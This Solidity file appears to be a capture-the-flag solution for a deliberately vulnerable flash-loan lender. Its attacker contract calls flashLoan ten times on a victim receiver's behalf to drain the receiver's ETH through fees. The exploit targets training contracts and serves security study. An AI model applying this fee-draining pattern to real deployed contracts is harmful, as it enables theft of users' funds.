// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FlashLoanReceiver.sol";
import "./NaiveReceiverLenderPool.sol";

contract FlashLoanReceiverAttacker {
    FlashLoanReceiver receiver;
    NaiveReceiverLenderPool pool;

    constructor(address _receiver, address _pool) {
        receiver = FlashLoanReceiver(payable(_receiver));
        pool = NaiveReceiverLenderPool(payable(_pool));
    }

    // function flashLoan(
    //     IERC3156FlashBorrower receiver,
    //     address token,
    //     uint256 amount,
    //     bytes calldata data
    // ) external returns (bool)
    function attack() external {
        for (uint i=0; i<10; i++) {
            pool.flashLoan(receiver, pool.ETH(), 0, "");
        }
        require(address(receiver).balance == 0, "Attack failed");
    }
}